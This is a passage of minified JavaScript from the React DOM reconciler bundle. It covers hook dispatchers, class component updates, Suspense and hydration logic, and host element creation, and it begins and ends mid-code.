s=n.lanes;s&=e.pendingLanes,t|=s,n.lanes=t,vl(e,t)}}var Ur={readContext:Ne,useCallback:re,useContext:re,useEffect:re,useImperativeHandle:re,useInsertionEffect:re,useLayoutEffect:re,useMemo:re,useReducer:re,useRef:re,useState:re,useDebugValue:re,useDeferredValue:re,useTransition:re,useMutableSource:re,useSyncExternalStore:re,useId:re,unstable_isNewReconciler:!1},tm={readContext:Ne,useCallback:function(e,n){return He().memoizedState=[e,n===void 0?null:n],e},useContext:Ne,useEffect:Zo,useImperativeHandle:function(e,n,t){return t=t!=null?t.concat([e]):null,mr(4194308,4,Pp.bind(null,n,e),t)},useLayoutEffect:function(e,n){return mr(4194308,4,e,n)},useInsertionEffect:function(e,n){return mr(4,2,e,n)},useMemo:function(e,n){var t=He();return n=n===void 0?null:n,e=e(),t.memoizedState=[e,n],e},useReducer:function(e,n,t){var s=He();return n=t!==void 0?t(n):n,s.memoizedState=s.baseState=n,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:n},s.queue=e,e=e.dispatch=em.bind(null,H,e),[s.memoizedState,e]},useRef:function(e){var n=He();return e={current:e},n.memoizedState=e},useState:Qo,useDebugValue:Bl,useDeferredValue:function(e){return He().memoizedState=e},useTransition:function(){var e=Qo(!1),n=e[0];return e=Jf.bind(null,e[1]),He().memoizedState=e,[n,e]},useMutableSource:function(){},useSyncExternalStore:function(e,n,t){var s=H,r=He();if(B){if(t===void 0)throw Error(S(407));t=t()}else{if(t=n(),J===null)throw Error(S(349));qn&30||xp(s,n,t)}r.memoizedState=t;var i={value:t,getSnapshot:n};return r.queue=i,Zo(_p.bind(null,s,i,e),[e]),s.flags|=2048,bs(9,Sp.bind(null,s,i,t,n),void 0,null),t},useId:function(){var e=He(),n=J.identifierPrefix;if(B){var t=Je,s=Ze;t=(s&~(1<<32-Me(s)-1)).toString(32)+t,n=":"+n+"R"+t,t=ws++,0<t&&(n+="H"+t.toString(32)),n+=":"}else t=Zf++,n=":"+n+"r"+t.toString(32)+":";return e.memoizedState=n},unstable_isNewReconciler:!1},sm={readContext:Ne,useCallback:Rp,useContext:Ne,useEffect:Fl,useImperativeHandle:Lp,useInsertionEffect:Np,useLayoutEffect:Ap,useMemo:Op,useReducer:$i,useRef:Cp,useState:function(){return $i(ks)},useDebugValue:Bl,useDeferredValue:function(e){var n=Ae();return jp(n,X.memoizedState,e)},useTransition:function(){var e=$i(ks)[0],n=Ae().memoizedState;return[e,n]},useMutableSource:kp,useSyncExternalStore:bp,useId:Ip,unstable_isNewReconciler:!1},rm={readContext:Ne,useCallback:Rp,useContext:Ne,useEffect:Fl,useImperativeHandle:Lp,useInsertionEffect:Np,useLayoutEffect:Ap,useMemo:Op,useReducer:Gi,useRef:Cp,useState:function(){return Gi(ks)},useDebugValue:Bl,useDeferredValue:function(e){var n=Ae();return X===null?n.memoizedState=e:jp(n,X.memoizedState,e)},useTransition:function(){var e=Gi(ks)[0],n=Ae().memoizedState;return[e,n]},useMutableSource:kp,useSyncExternalStore:bp,useId:Ip,unstable_isNewReconciler:!1};function Le(e,n){if(e&&e.defaultProps){n=V({},n),e=e.defaultProps;for(var t in e)n[t]===void 0&&(n[t]=e[t]);return n}return n}function Ra(e,n,t,s){n=e.memoizedState,t=t(s,n),t=t==null?n:V({},n,t),e.memoizedState=t,e.lanes===0&&(e.updateQueue.baseState=t)}var ci={isMounted:function(e){return(e=e._reactInternals)?Jn(e)===e:!1},enqueueSetState:function(e,n,t){e=e._reactInternals;var s=ce(),r=En(e),i=en(s,r);i.payload=n,t!=null&&(i.callback=t),n=Sn(e,i,r),n!==null&&(De(n,e,r,s),hr(n,e,r))},enqueueReplaceState:function(e,n,t){e=e._reactInternals;var s=ce(),r=En(e),i=en(s,r);i.tag=1,i.payload=n,t!=null&&(i.callback=t),n=Sn(e,i,r),n!==null&&(De(n,e,r,s),hr(n,e,r))},enqueueForceUpdate:function(e,n){e=e._reactInternals;var t=ce(),s=En(e),r=en(t,s);r.tag=2,n!=null&&(r.callback=n),n=Sn(e,r,s),n!==null&&(De(n,e,s,t),hr(n,e,s))}};function Jo(e,n,t,s,r,i,a){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(s,i,a):n.prototype&&n.prototype.isPureReactComponent?!hs(t,s)||!hs(r,i):!0}function Fp(e,n,t){var s=!1,r=An,i=n.contextType;return typeof i=="object"&&i!==null?i=Ne(i):(r=ge(n)?Gn:le.current,s=n.contextTypes,i=(s=s!=null)?xt(e,r):An),n=new n(t,i),e.memoizedState=n.state!==null&&n.state!==void 0?n.state:null,n.updater=ci,e.stateNode=n,n._reactInternals=e,s&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=r,e.__reactInternalMemoizedMaskedChildContext=i),n}function ec(e,n,t,s){e=n.state,typeof n.componentWillReceiveProps=="function"&&n.componentWillReceiveProps(t,s),typeof n.UNSAFE_componentWillReceiveProps=="function"&&n.UNSAFE_componentWillReceiveProps(t,s),n.state!==e&&ci.enqueueReplaceState(n,n.state,null)}function Oa(e,n,t,s){var r=e.stateNode;r.props=t,r.state=e.memoizedState,r.refs={},Rl(e);var i=n.contextType;typeof i=="object"&&i!==null?r.context=Ne(i):(i=ge(n)?Gn:le.current,r.context=xt(e,i)),r.state=e.memoizedState,i=n.getDerivedStateFromProps,typeof i=="function"&&(Ra(e,n,i,t),r.state=e.memoizedState),typeof n.getDerivedStateFromProps=="function"||typeof r.getSnapshotBeforeUpdate=="function"||typeof r.UNSAFE_componentWillMount!="function"&&typeof r.componentWillMount!="function"||(n=r.state,typeof r.componentWillMount=="function"&&r.componentWillMount(),typeof r.UNSAFE_componentWillMount=="function"&&r.UNSAFE_componentWillMount(),n!==r.state&&ci.enqueueReplaceState(r,r.state,null),zr(e,t,r,s),r.state=e.memoizedState),typeof r.componentDidMount=="function"&&(e.flags|=4194308)}function Tt(e,n){try{var t="",s=n;do t+=Lh(s),s=s.return;while(s);var r=t}catch(i){r=`
Error generating stack: `+i.message+`
`+i.stack}return{value:e,source:n,stack:r,digest:null}}function Yi(e,n,t){return{value:e,source:null,stack:t??null,digest:n??null}}function ja(e,n){try{console.error(n.value)}catch(t){setTimeout(function(){throw t})}}var im=typeof WeakMap=="function"?WeakMap:Map;function Bp(e,n,t){t=en(-1,t),t.tag=3,t.payload={element:null};var s=n.value;return t.callback=function(){Vr||(Vr=!0,Wa=s),ja(e,n)},t}function Up(e,n,t){t=en(-1,t),t.tag=3;var s=e.type.getDerivedStateFromError;if(typeof s=="function"){var r=n.value;t.payload=function(){return s(r)},t.callback=function(){ja(e,n)}}var i=e.stateNode;return i!==null&&typeof i.componentDidCatch=="function"&&(t.callback=function(){ja(e,n),typeof s!="function"&&(_n===null?_n=new Set([this]):_n.add(this));var a=n.stack;this.componentDidCatch(n.value,{componentStack:a!==null?a:""})}),t}function nc(e,n,t){var s=e.pingCache;if(s===null){s=e.pingCache=new im;var r=new Set;s.set(n,r)}else r=s.get(n),r===void 0&&(r=new Set,s.set(n,r));r.has(t)||(r.add(t),e=wm.bind(null,e,n,t),n.then(e,e))}function tc(e){do{var n;if((n=e.tag===13)&&(n=e.memoizedState,n=n!==null?n.dehydrated!==null:!0),n)return e;e=e.return}while(e!==null);return null}function sc(e,n,t,s,r){return e.mode&1?(e.flags|=65536,e.lanes=r,e):(e===n?e.flags|=65536:(e.flags|=128,t.flags|=131072,t.flags&=-52805,t.tag===1&&(t.alternate===null?t.tag=17:(n=en(-1,1),n.tag=2,Sn(t,n,1))),t.lanes|=1),e)}var am=ln.ReactCurrentOwner,he=!1;function oe(e,n,t,s){n.child=e===null?gp(n,null,t,s):_t(n,e.child,t,s)}function rc(e,n,t,s,r){t=t.render;var i=n.ref;return yt(n,r),s=Dl(e,n,t,s,i,r),t=zl(),e!==null&&!he?(n.updateQueue=e.updateQueue,n.flags&=-2053,e.lanes&=~r,rn(e,n,r)):(B&&t&&El(n),n.flags|=1,oe(e,n,s,r),n.child)}function ic(e,n,t,s,r){if(e===null){var i=t.type;return typeof i=="function"&&!ql(i)&&i.defaultProps===void 0&&t.compare===null&&t.defaultProps===void 0?(n.tag=15,n.type=i,Hp(e,n,i,s,r)):(e=wr(t.type,null,s,n,n.mode,r),e.ref=n.ref,e.return=n,n.child=e)}if(i=e.child,!(e.lanes&r)){var a=i.memoizedProps;if(t=t.compare,t=t!==null?t:hs,t(a,s)&&e.ref===n.ref)return rn(e,n,r)}return n.flags|=1,e=Tn(i,s),e.ref=n.ref,e.return=n,n.child=e}function Hp(e,n,t,s,r){if(e!==null){var i=e.memoizedProps;if(hs(i,s)&&e.ref===n.ref)if(he=!1,n.pendingProps=s=i,(e.lanes&r)!==0)e.flags&131072&&(he=!0);else return n.lanes=e.lanes,rn(e,n,r)}return Ia(e,n,t,s,r)}function Vp(e,n,t){var s=n.pendingProps,r=s.children,i=e!==null?e.memoizedState:null;if(s.mode==="hidden")if(!(n.mode&1))n.memoizedState={baseLanes:0,cachePool:null,transitions:null},D(ht,ye),ye|=t;else{if(!(t&1073741824))return e=i!==null?i.baseLanes|t:t,n.lanes=n.childLanes=1073741824,n.memoizedState={baseLanes:e,cachePool:null,transitions:null},n.updateQueue=null,D(ht,ye),ye|=e,null;n.memoizedState={baseLanes:0,cachePool:null,transitions:null},s=i!==null?i.baseLanes:t,D(ht,ye),ye|=s}else i!==null?(s=i.baseLanes|t,n.memoizedState=null):s=t,D(ht,ye),ye|=s;return oe(e,n,r,t),n.child}function Wp(e,n){var t=n.ref;(e===null&&t!==null||e!==null&&e.ref!==t)&&(n.flags|=512,n.flags|=2097152)}function Ia(e,n,t,s,r){var i=ge(t)?Gn:le.current;return i=xt(n,i),yt(n,r),t=Dl(e,n,t,s,i,r),s=zl(),e!==null&&!he?(n.updateQueue=e.updateQueue,n.flags&=-2053,e.lanes&=~r,rn(e,n,r)):(B&&s&&El(n),n.flags|=1,oe(e,n,t,r),n.child)}function ac(e,n,t,s,r){if(ge(t)){var i=!0;Or(n)}else i=!1;if(yt(n,r),n.stateNode===null)gr(e,n),Fp(n,t,s),Oa(n,t,s,r),s=!0;else if(e===null){var a=n.stateNode,l=n.memoizedProps;a.props=l;var o=a.context,c=t.contextType;typeof c=="object"&&c!==null?c=Ne(c):(c=ge(t)?Gn:le.current,c=xt(n,c));var p=t.getDerivedStateFromProps,d=typeof p=="function"||typeof a.getSnapshotBeforeUpdate=="function";d||typeof a.UNSAFE_componentWillReceiveProps!="function"&&typeof a.componentWillReceiveProps!="function"||(l!==s||o!==c)&&ec(n,a,s,c),dn=!1;var h=n.memoizedState;a.state=h,zr(n,s,a,r),o=n.memoizedState,l!==s||h!==o||me.current||dn?(typeof p=="function"&&(Ra(n,t,p,s),o=n.memoizedState),(l=dn||Jo(n,t,l,s,h,o,c))?(d||typeof a.UNSAFE_componentWillMount!="function"&&typeof a.componentWillMount!="function"||(typeof a.componentWillMount=="function"&&a.componentWillMount(),typeof a.UNSAFE_componentWillMount=="function"&&a.UNSAFE_componentWillMount()),typeof a.componentDidMount=="function"&&(n.flags|=4194308)):(typeof a.componentDidMount=="function"&&(n.flags|=4194308),n.memoizedProps=s,n.memoizedState=o),a.props=s,a.state=o,a.context=c,s=l):(typeof a.componentDidMount=="function"&&(n.flags|=4194308),s=!1)}else{a=n.stateNode,yp(e,n),l=n.memoizedProps,c=n.type===n.elementType?l:Le(n.type,l),a.props=c,d=n.pendingProps,h=a.context,o=t.contextType,typeof o=="object"&&o!==null?o=Ne(o):(o=ge(t)?Gn:le.current,o=xt(n,o));var v=t.getDerivedStateFromProps;(p=typeof v=="function"||typeof a.getSnapshotBeforeUpdate=="function")||typeof a.UNSAFE_componentWillReceiveProps!="function"&&typeof a.componentWillReceiveProps!="function"||(l!==d||h!==o)&&ec(n,a,s,o),dn=!1,h=n.memoizedState,a.state=h,zr(n,s,a,r);var y=n.memoizedState;l!==d||h!==y||me.current||dn?(typeof v=="function"&&(Ra(n,t,v,s),y=n.memoizedState),(c=dn||Jo(n,t,c,s,h,y,o)||!1)?(p||typeof a.UNSAFE_componentWillUpdate!="function"&&typeof a.componentWillUpdate!="function"||(typeof a.componentWillUpdate=="function"&&a.componentWillUpdate(s,y,o),typeof a.UNSAFE_componentWillUpdate=="function"&&a.UNSAFE_componentWillUpdate(s,y,o)),typeof a.componentDidUpdate=="function"&&(n.flags|=4),typeof a.getSnapshotBeforeUpdate=="function"&&(n.flags|=1024)):(typeof a.componentDidUpdate!="function"||l===e.memoizedProps&&h===e.memoizedState||(n.flags|=4),typeof a.getSnapshotBeforeUpdate!="function"||l===e.memoizedProps&&h===e.memoizedState||(n.flags|=1024),n.memoizedProps=s,n.memoizedState=y),a.props=s,a.state=y,a.context=o,s=c):(typeof a.componentDidUpdate!="function"||l===e.memoizedProps&&h===e.memoizedState||(n.flags|=4),typeof a.getSnapshotBeforeUpdate!="function"||l===e.memoizedProps&&h===e.memoizedState||(n.flags|=1024),s=!1)}return Ma(e,n,t,s,i,r)}function Ma(e,n,t,s,r,i){Wp(e,n);var a=(n.flags&128)!==0;if(!s&&!a)return r&&$o(n,t,!1),rn(e,n,i);s=n.stateNode,am.current=n;var l=a&&typeof t.getDerivedStateFromError!="function"?null:s.render();return n.flags|=1,e!==null&&a?(n.child=_t(n,e.child,null,i),n.child=_t(n,null,l,i)):oe(e,n,l,i),n.memoizedState=s.state,r&&$o(n,t,!0),n.child}function $p(e){var n=e.stateNode;n.pendingContext?Wo(e,n.pendingContext,n.pendingContext!==n.context):n.context&&Wo(e,n.context,!1),Ol(e,n.containerInfo)}function lc(e,n,t,s,r){return St(),Cl(r),n.flags|=256,oe(e,n,t,s),n.child}var Da={dehydrated:null,treeContext:null,retryLane:0};function za(e){return{baseLanes:e,cachePool:null,transitions:null}}function Gp(e,n,t){var s=n.pendingProps,r=U.current,i=!1,a=(n.flags&128)!==0,l;if((l=a)||(l=e!==null&&e.memoizedState===null?!1:(r&2)!==0),l?(i=!0,n.flags&=-129):(e===null||e.memoizedState!==null)&&(r|=1),D(U,r&1),e===null)return Pa(n),e=n.memoizedState,e!==null&&(e=e.dehydrated,e!==null)?(n.mode&1?e.data==="$!"?n.lanes=8:n.lanes=1073741824:n.lanes=1,null):(a=s.children,e=s.fallback,i?(s=n.mode,i=n.child,a={mode:"hidden",children:a},!(s&1)&&i!==null?(i.childLanes=0,i.pendingProps=a):i=di(a,s,0,null),e=Vn(e,s,t,null),i.return=n,e.return=n,i.sibling=e,n.child=i,n.child.memoizedState=za(t),n.memoizedState=Da,e):Ul(n,a));if(r=e.memoizedState,r!==null&&(l=r.dehydrated,l!==null))return lm(e,n,a,s,l,r,t);if(i){i=s.fallback,a=n.mode,r=e.child,l=r.sibling;var o={mode:"hidden",children:s.children};return!(a&1)&&n.child!==r?(s=n.child,s.childLanes=0,s.pendingProps=o,n.deletions=null):(s=Tn(r,o),s.subtreeFlags=r.subtreeFlags&14680064),l!==null?i=Tn(l,i):(i=Vn(i,a,t,null),i.flags|=2),i.return=n,s.return=n,s.sibling=i,n.child=s,s=i,i=n.child,a=e.child.memoizedState,a=a===null?za(t):{baseLanes:a.baseLanes|t,cachePool:null,transitions:a.transitions},i.memoizedState=a,i.childLanes=e.childLanes&~t,n.memoizedState=Da,s}return i=e.child,e=i.sibling,s=Tn(i,{mode:"visible",children:s.children}),!(n.mode&1)&&(s.lanes=t),s.return=n,s.sibling=null,e!==null&&(t=n.deletions,t===null?(n.deletions=[e],n.flags|=16):t.push(e)),n.child=s,n.memoizedState=null,s}function Ul(e,n){return n=di({mode:"visible",children:n},e.mode,0,null),n.return=e,e.child=n}function Js(e,n,t,s){return s!==null&&Cl(s),_t(n,e.child,null,t),e=Ul(n,n.pendingProps.children),e.flags|=2,n.memoizedState=null,e}function lm(e,n,t,s,r,i,a){if(t)return n.flags&256?(n.flags&=-257,s=Yi(Error(S(422))),Js(e,n,a,s)):n.memoizedState!==null?(n.child=e.child,n.flags|=128,null):(i=s.fallback,r=n.mode,s=di({mode:"visible",children:s.children},r,0,null),i=Vn(i,r,a,null),i.flags|=2,s.return=n,i.return=n,s.sibling=i,n.child=s,n.mode&1&&_t(n,e.child,null,a),n.child.memoizedState=za(a),n.memoizedState=Da,i);if(!(n.mode&1))return Js(e,n,a,null);if(r.data==="$!"){if(s=r.nextSibling&&r.nextSibling.dataset,s)var l=s.dgst;return s=l,i=Error(S(419)),s=Yi(i,s,void 0),Js(e,n,a,s)}if(l=(a&e.childLanes)!==0,he||l){if(s=J,s!==null){switch(a&-a){case 4:r=2;break;case 16:r=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:r=32;break;case 536870912:r=268435456;break;default:r=0}r=r&(s.suspendedLanes|a)?0:r,r!==0&&r!==i.retryLane&&(i.retryLane=r,sn(e,r),De(s,e,r,-1))}return Yl(),s=Yi(Error(S(421))),Js(e,n,a,s)}return r.data==="$?"?(n.flags|=128,n.child=e.child,n=km.bind(null,e),r._reactRetry=n,null):(e=i.treeContext,we=xn(r.nextSibling),ke=n,B=!0,Oe=null,e!==null&&(_e[Ee++]=Ze,_e[Ee++]=Je,_e[Ee++]=Yn,Ze=e.id,Je=e.overflow,Yn=n),n=Ul(n,s.children),n.flags|=4096,n)}function oc(e,n,t){e.lanes|=n;var s=e.alternate;s!==null&&(s.lanes|=n),La(e.return,n,t)}function qi(e,n,t,s,r){var i=e.memoizedState;i===null?e.memoizedState={isBackwards:n,rendering:null,renderingStartTime:0,last:s,tail:t,tailMode:r}:(i.isBackwards=n,i.rendering=null,i.renderingStartTime=0,i.last=s,i.tail=t,i.tailMode=r)}function Yp(e,n,t){var s=n.pendingProps,r=s.revealOrder,i=s.tail;if(oe(e,n,s.children,t),s=U.current,s&2)s=s&1|2,n.flags|=128;else{if(e!==null&&e.flags&128)e:for(e=n.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&oc(e,t,n);else if(e.tag===19)oc(e,t,n);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===n)break e;for(;e.sibling===null;){if(e.return===null||e.return===n)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}s&=1}if(D(U,s),!(n.mode&1))n.memoizedState=null;else switch(r){case"forwards":for(t=n.child,r=null;t!==null;)e=t.alternate,e!==null&&Fr(e)===null&&(r=t),t=t.sibling;t=r,t===null?(r=n.child,n.child=null):(r=t.sibling,t.sibling=null),qi(n,!1,r,t,i);break;case"backwards":for(t=null,r=n.child,n.child=null;r!==null;){if(e=r.alternate,e!==null&&Fr(e)===null){n.child=r;break}e=r.sibling,r.sibling=t,t=r,r=e}qi(n,!0,t,null,i);break;case"together":qi(n,!1,null,null,void 0);break;default:n.memoizedState=null}return n.child}function gr(e,n){!(n.mode&1)&&e!==null&&(e.alternate=null,n.alternate=null,n.flags|=2)}function rn(e,n,t){if(e!==null&&(n.dependencies=e.dependencies),Xn|=n.lanes,!(t&n.childLanes))return null;if(e!==null&&n.child!==e.child)throw Error(S(153));if(n.child!==null){for(e=n.child,t=Tn(e,e.pendingProps),n.child=t,t.return=n;e.sibling!==null;)e=e.sibling,t=t.sibling=Tn(e,e.pendingProps),t.return=n;t.sibling=null}return n.child}function om(e,n,t){switch(n.tag){case 3:$p(n),St();break;case 5:wp(n);break;case 1:ge(n.type)&&Or(n);break;case 4:Ol(n,n.stateNode.containerInfo);break;case 10:var s=n.type._context,r=n.memoizedProps.value;D(Mr,s._currentValue),s._currentValue=r;break;case 13:if(s=n.memoizedState,s!==null)return s.dehydrated!==null?(D(U,U.current&1),n.flags|=128,null):t&n.child.childLanes?Gp(e,n,t):(D(U,U.current&1),e=rn(e,n,t),e!==null?e.sibling:null);D(U,U.current&1);break;case 19:if(s=(t&n.childLanes)!==0,e.flags&128){if(s)return Yp(e,n,t);n.flags|=128}if(r=n.memoizedState,r!==null&&(r.rendering=null,r.tail=null,r.lastEffect=null),D(U,U.current),s)break;return null;case 22:case 23:return n.lanes=0,Vp(e,n,t)}return rn(e,n,t)}var qp,Fa,Xp,Kp;qp=function(e,n){for(var t=n.child;t!==null;){if(t.tag===5||t.tag===6)e.appendChild(t.stateNode);else if(t.tag!==4&&t.child!==null){t.child.return=t,t=t.child;continue}if(t===n)break;for(;t.sibling===null;){if(t.return===null||t.return===n)return;t=t.return}t.sibling.return=t.return,t=t.sibling}};Fa=function(){};Xp=function(e,n,t,s){var r=e.memoizedProps;if(r!==s){e=n.stateNode,Bn($e.current);var i=null;switch(t){case"input":r=la(e,r),s=la(e,s),i=[];break;case"select":r=V({},r,{value:void 0}),s=V({},s,{value:void 0}),i=[];break;case"textarea":r=ua(e,r),s=ua(e,s),i=[];break;default:typeof r.onClick!="function"&&typeof s.onClick=="function"&&(e.onclick=Lr)}da(t,s);var a;t=null;for(c in r)if(!s.hasOwnProperty(c)&&r.hasOwnProperty(c)&&r[c]!=null)if(c==="style"){var l=r[c];for(a in l)l.hasOwnProperty(a)&&(t||(t={}),t[a]="")}else c!=="dangerouslySetInnerHTML"&&c!=="children"&&c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&c!=="autoFocus"&&(as.hasOwnProperty(c)?i||(i=[]):(i=i||[]).push(c,null));for(c in s){var o=s[c];if(l=r!=null?r[c]:void 0,s.hasOwnProperty(c)&&o!==l&&(o!=null||l!=null))if(c==="style")if(l){for(a in l)!l.hasOwnProperty(a)||o&&o.hasOwnProperty(a)||(t||(t={}),t[a]="");for(a in o)o.hasOwnProperty(a)&&l[a]!==o[a]&&(t||(t={}),t[a]=o[a])}else t||(i||(i=[]),i.push(c,t)),t=o;else c==="dangerouslySetInnerHTML"?(o=o?o.__html:void 0,l=l?l.__html:void 0,o!=null&&l!==o&&(i=i||[]).push(c,o)):c==="children"?typeof o!="string"&&typeof o!="number"||(i=i||[]).push(c,""+o):c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&(as.hasOwnProperty(c)?(o!=null&&c==="onScroll"&&z("scroll",e),i||l===o||(i=[])):(i=i||[]).push(c,o))}t&&(i=i||[]).push("style",t);var c=i;(n.updateQueue=c)&&(n.flags|=4)}};Kp=function(e,n,t,s){t!==s&&(n.flags|=4)};function Bt(e,n){if(!B)switch(e.tailMode){case"hidden":n=e.tail;for(var t=null;n!==null;)n.alternate!==null&&(t=n),n=n.sibling;t===null?e.tail=null:t.sibling=null;break;case"collapsed":t=e.tail;for(var s=null;t!==null;)t.alternate!==null&&(s=t),t=t.sibling;s===null?n||e.tail===null?e.tail=null:e.tail.sibling=null:s.sibling=null}}function ie(e){var n=e.alternate!==null&&e.alternate.child===e.child,t=0,s=0;if(n)for(var r=e.child;r!==null;)t|=r.lanes|r.childLanes,s|=r.subtreeFlags&14680064,s|=r.flags&14680064,r.return=e,r=r.sibling;else for(r=e.child;r!==null;)t|=r.lanes|r.childLanes,s|=r.subtreeFlags,s|=r.flags,r.return=e,r=r.sibling;return e.subtreeFlags|=s,e.childLanes=t,n}function cm(e,n,t){var s=n.pendingProps;switch(Tl(n),n.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return ie(n),null;case 1:return ge(n.type)&&Rr(),ie(n),null;case 3:return s=n.stateNode,Et(),F(me),F(le),Il(),s.pendingContext&&(s.context=s.pendingContext,s.pendingContext=null),(e===null||e.child===null)&&(Qs(n)?n.flags|=4:e===null||e.memoizedState.isDehydrated&&!(n.flags&256)||(n.flags|=1024,Oe!==null&&(Ya(Oe),Oe=null))),Fa(e,n),ie(n),null;case 5:jl(n);var r=Bn(ys.current);if(t=n.type,e!==null&&n.stateNode!=null)Xp(e,n,t,s,r),e.ref!==n.ref&&(n.flags|=512,n.flags|=2097152);else{if(!s){if(n.stateNode===null)throw Error(S(166));return ie(n),null}if(e=Bn($e.current),Qs(n)){s=n.stateNode,t=n.type;var i=n.memoizedProps;switch(s[Ve]=n,s[gs]=i,e=(n.mode&1)!==0,t){case"dialog":z("cancel",s),z("close",s);break;case"iframe":case"object":case"embed":z("load",s);break;case"video":case"audio":for(r=0;r<Gt.length;r++)z(Gt[r],s);break;case"source":z("error",s);break;case"img":case"image":case"link":z("error",s),z("load",s);break;case"details":z("toggle",s);break;case"input":vo(s,i),z("invalid",s);break;case"select":s._wrapperState={wasMultiple:!!i.multiple},z("invalid",s);break;case"textarea":wo(s,i),z("invalid",s)}da(t,i),r=null;for(var a in i)if(i.hasOwnProperty(a)){var l=i[a];a==="children"?typeof l=="string"?s.textContent!==l&&(i.suppressHydrationWarning!==!0&&Ks(s.textContent,l,e),r=["children",l]):typeof l=="number"&&s.textContent!==""+l&&(i.suppressHydrationWarning!==!0&&Ks(s.textContent,l,e),r=["children",""+l]):as.hasOwnProperty(a)&&l!=null&&a==="onScroll"&&z("scroll",s)}switch(t){case"input":Hs(s),yo(s,i,!0);break;case"textarea":Hs(s),ko(s);break;case"select":case"option":break;default:typeof i.onClick=="function"&&(s.onclick=Lr)}s=r,n.updateQueue=s,s!==null&&(n.flags|=4)}else{a=r.nodeType===9?r:r.ownerDocument,e==="http://www.w3.org/1999/xhtml"&&(e=_u(t)),e==="http://www.w3.org/1999/xhtml"?t==="script"?(e=a.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):typeof s.is=="string"?e=a.createElement(t,{is:s.is}):(e=a.createElement(t),t==="select"&&(a=e,s.multiple?a.multiple=!0:s.size&&(a.size=s.size))):e=a.createElementNS(e,t),e[Ve]=n,e[gs]=s,qp(e,n,!1,!1),n.stateNode=e;e:{switch(a=ha(t,s),t){case"dialog":z("cancel",e),z("close",e),r=s;break;case"iframe":case"object":case"embed":z("load",e),r=s;break;case"video":case"audio":for(r=0;r<Gt.length;r++)z(Gt[r],e);r=s;break;case"source":z("error",e),r=s;break;case"img":case"image":case"link":z("error",e),z("load",e),r=s;break;case"details":z("toggle",e),r=s;break;case"input":vo(e,s),r=la(e,s),z("invalid",e);break;case"option":r=s;break;case"select":e._wrapperState={wasMultiple:!!s.multiple},r=V({},s,{value:void 0}),z("invalid",e);break;case"textarea":wo(e,s),r=ua(e,s),z("invalid",e);break;default:r=s}da(t,r),l=r;for(i in l)if(l.hasOwnProperty(i)){var o=l[i];i==="style"?Cu(e,o):i==="dangerouslySetInnerHTML"?(o=o?o.__html:void 0,o!=null&&Eu(e,o)):i==="children"?typeof o=="string"?(t!=="textarea"||o!=="")&&ls(e,o):typeof o=="number"&&ls(e,""+o):i!=="suppressContentEditableWarning"&&i!=="suppressHydrationWarning"&&i!=="autoFocus"&&(as.hasOwnProperty(i)?o!=null&&i==="onScroll"&&z("scroll",e):o!=null&&pl(e,i,o,a))}switch(t){case"input":Hs(e),yo(e,s,!1);break;case"textarea":Hs(e),ko(e);break;case"option":s.value!=null&&e.setAttribute("value",""+Nn(s.value));break;case"select":e.multiple=!!s.multiple,i=s.value,i!=null?ft(e,!!s.multiple,i,!1):s.defaultValue!=null&&ft(e,!!s.multiple,s.defaultValue,!0);break;default:typeof r.onClick=="function"&&(e.onclick=Lr)}switch(t){case"button":case"input":case"select":case"textarea":s=!!s.autoFocus;break e;case"img":s=!0;break e;default:s=!1}}s&&(n.flags|=4)}n.ref!==null&&(n.flags|=512,n.flags|=2097152)}return ie(n),null;case 6:if(e&&n.stateNode!=null)Kp(e,n,e.memoizedProps,s);else{if(typeof s!="string"&&n.stateNode===null)throw Error(S(166));if(t=Bn(ys.current),Bn($e.current),Qs(n)){if(s=n.stateNode,t=n.memoizedProps,s[Ve]=n,(i=s.nodeValue!==t)&&(e=ke,e!==null))switch(e.tag){case 3:Ks(s.nodeValue,t,(e.mode&1)!==0);break;case 5:e.memoizedProps.suppressHydrationWarning!==!0&&Ks(s.nodeValue,t,(e.mode&1)!==0)}i&&(n.flags|=4)}else s=(t.nodeType===9?t:t.ownerDocument).createTextNode(s),s[Ve]=n,n.stateNode=s}return ie(n),null;case 13:if(F(U),s=n.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(B&&we!==null&&n.mode&1&&!(n.flags&128))fp(),St(),n.flags|=98560,i=!1;else if(i=Qs(n),s!==null&&s.dehydrated!==null){if(e===null){if(!i)throw Error(S(318));if(i=n.memoizedState,i=i!==null?i.dehydrated:null,!i)throw Error(S(317));i[Ve]=n}else St(),!(n.flags&128)&&(n.memoizedState=null),n.flags|=4;ie(n),i=!1}else Oe!==null&&(Ya(Oe),Oe=null),i=!0;if(!i)return n.flags&65536?n:null}return n.flags&128?(n.lanes=t,n):(s=s!==null,s!==(e!==null&&e.memoizedState!==null)&&s&&(n.child.flags|=8192,n.mode&1&&(e===null||U.current&1?K===0&&(K=3):Yl())),n.updateQueue!==null&&(n.flags|=4),ie(n),null);case 4:return Et(),Fa(e,n),e===null&&fs(n.stateNode.containerInfo),ie(n),null;case 10:return Pl(n.type._context),ie(n),null;case 17:return ge(n.type)&&Rr(),ie(n),null;case 19:if(F(U),i=n.memoizedState,i===null)return 